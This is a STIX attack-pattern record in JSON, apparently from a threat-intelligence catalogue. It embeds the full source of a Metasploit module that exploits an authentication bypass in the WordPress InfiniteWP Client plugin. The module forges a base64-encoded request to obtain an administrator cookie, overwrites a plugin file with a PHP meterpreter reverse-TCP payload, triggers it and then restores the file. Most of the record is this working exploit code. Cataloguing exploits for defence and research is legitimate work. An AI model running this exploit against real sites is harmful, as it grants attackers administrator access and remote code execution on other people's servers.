{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b61905b0-c3aa-45b6-9172-f3489d7133ac",
    "created": "2024-08-14T17:12:14.367047Z",
    "modified": "2024-08-14T17:12:14.367051Z",
    "name": "WordPress InfiniteWP Client Authentication Bypass",
    "description": " This module exploits an authentication bypass in the WordPress InfiniteWP Client plugin to log in as an administrator and execute arbitrary PHP code by overwriting the file specified by PLUGIN_FILE.  The module will attempt to retrieve the original PLUGIN_FILE contents and restore them after payload execution. If VerifyContents is set which is the default setting, the module will check to see if the restored contents match the original.  Note that a valid administrator username is required for this module.  WordPress >= 4.9 is currently not supported due to a breaking WordPress API change. Tested against 4.8.3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_infinitewp_auth_bypass.rb",
            "external_id": "wp_infinitewp_auth_bypass.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "10011"
        },
        {
            "source_name": "reference",
            "url": "https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/"
        },
        {
            "source_name": "reference",
            "url": "https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2020/01/authentication-bypass-vulnerability-in-infinitewp-client.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ManualRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress InfiniteWP Client Authentication Bypass',\n      'Description'    => %q{\n        This module exploits an authentication bypass in the WordPress\n        InfiniteWP Client plugin to log in as an administrator and execute\n        arbitrary PHP code by overwriting the file specified by PLUGIN_FILE.\n\n        The module will attempt to retrieve the original PLUGIN_FILE contents\n        and restore them after payload execution. If VerifyContents is set,\n        which is the default setting, the module will check to see if the\n        restored contents match the original.\n\n        Note that a valid administrator username is required for this module.\n\n        WordPress >= 4.9 is currently not supported due to a breaking WordPress\n        API change. Tested against 4.8.3.\n      },\n      'Author'         => [\n        'WebARX', # Discovery\n        'wvu'     # Module\n      ],\n      'References'     => [\n        ['WPVDB', '10011'],\n        ['URL', 'https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/'],\n        ['URL', 'https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/'],\n        ['URL', 'https://blog.sucuri.net/2020/01/authentication-bypass-vulnerability-in-infinitewp-client.html']\n      ],\n      'DisclosureDate' => '2020-01-14',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Privileged'     => false,\n      'Targets'        => [['InfiniteWP Client < 1.9.4.5', {}]],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {'PAYLOAD' => 'php/meterpreter/reverse_tcp'},\n      'Notes'          => {\n        'Stability'    => [CRASH_SAFE],\n        'Reliability'  => [REPEATABLE_SESSION],\n        'SideEffects'  => [IOC_IN_LOGS, CONFIG_CHANGES]\n      }\n    ))\n\n    register_options([\n      OptString.new('USERNAME',    [true, 'WordPress username', 'admin']),\n      OptString.new('PLUGIN_FILE', [true, 'Plugin file to edit', 'index.php'])\n    ])\n\n    register_advanced_options([\n      OptBool.new('VerifyContents', [false, 'Verify file contents', true])\n    ])\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def plugin_file\n    datastore['PLUGIN_FILE']\n  end\n\n  def plugin_uri\n    normalize_uri(wordpress_url_plugins, plugin_file)\n  end\n\n  def check\n    unless wordpress_and_online?\n      return CheckCode::Unknown('Is the site online and running WordPress?')\n    end\n\n    unless (version = wordpress_version)\n      return CheckCode::Unknown('Could not detect WordPress version.')\n    end\n\n    if Rex::Version.new(version) >= Rex::Version.new('4.9')\n      return CheckCode::Safe(\"WordPress #{version} is an unsupported target.\")\n    end\n\n    vprint_good(\"WordPress #{version} is a supported target\")\n\n    check_version_from_custom_file(\n      normalize_uri(wordpress_url_plugins, '/iwp-client/readme.txt'),\n      /^= ([\\d.]+)/,\n      '1.9.4.5'\n    )\n  end\n\n  # https://plugins.trac.wordpress.org/browser/iwp-client/tags/1.9.4.4/init.php\n  def auth_bypass\n    json = {\n      'iwp_action' => %w[add_site readd_site].sample,\n      'params'     => {'username' => username}\n    }.to_json\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => wordpress_url_backend,\n      'data'   => \"_IWP_JSON_PREFIX_#{Rex::Text.encode_base64(json)}\"\n    )\n\n    unless res && res.code == 200 && !(cookie = res.get_cookies).empty?\n      fail_with(Failure::NoAccess, \"Could not obtain cookie for #{username}\")\n    end\n\n    print_good(\"Successfully obtained cookie for #{username}\")\n    vprint_status(\"Cookie: #{cookie}\")\n\n    cookie\n  end\n\n  def exploit\n    print_status(\"Bypassing auth for #{username} at #{full_uri}\")\n    unless (@cookie = auth_bypass).include?('wordpress_logged_in')\n      fail_with(Failure::NoAccess, \"Could not log in as #{username}\")\n    end\n\n    print_good(\"Successfully logged in as #{username}\")\n    write_and_exec_payload\n  end\n\n  def write_and_exec_payload\n    print_status(\"Retrieving original contents of #{plugin_uri}\")\n    contents = wordpress_helper_get_plugin_file_contents(@cookie, plugin_file)\n\n    unless contents\n      fail_with(Failure::UnexpectedReply, \"Could not retrieve #{plugin_uri}\")\n    end\n\n    print_good(\"Successfully retrieved original contents of #{plugin_uri}\")\n    vprint_status('Contents:')\n    print(contents)\n\n    print_status(\"Overwriting #{plugin_uri} with payload\")\n    unless wordpress_edit_plugin(plugin_file, payload.encoded, @cookie)\n      fail_with(Failure::UnexpectedReply, \"Could not overwrite #{plugin_uri}\")\n    end\n\n    print_good(\"Successfully overwrote #{plugin_uri} with payload\")\n\n    print_status(\"Requesting payload at #{plugin_uri}\")\n    send_request_cgi({\n      'method' => 'GET',\n      'uri'    => plugin_uri\n    }, 0)\n\n    restore_contents(contents)\n  end\n\n  def restore_contents(og_contents)\n    print_status(\"Restoring original contents of #{plugin_uri}\")\n    unless wordpress_edit_plugin(plugin_file, og_contents, @cookie)\n      fail_with(Failure::UnexpectedReply, \"Could not restore #{plugin_uri}\")\n    end\n\n    return unless datastore['VerifyContents']\n\n    contents = wordpress_helper_get_plugin_file_contents(@cookie, plugin_file)\n\n    unless contents == og_contents\n      fail_with(Failure::UnexpectedReply,\n                \"Current contents of #{plugin_uri} DO NOT match original!\")\n    end\n\n    print_good(\"Current contents of #{plugin_uri} match original!\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-01-14",
    "x_mitre_platforms": [
        "php'"
    ]
}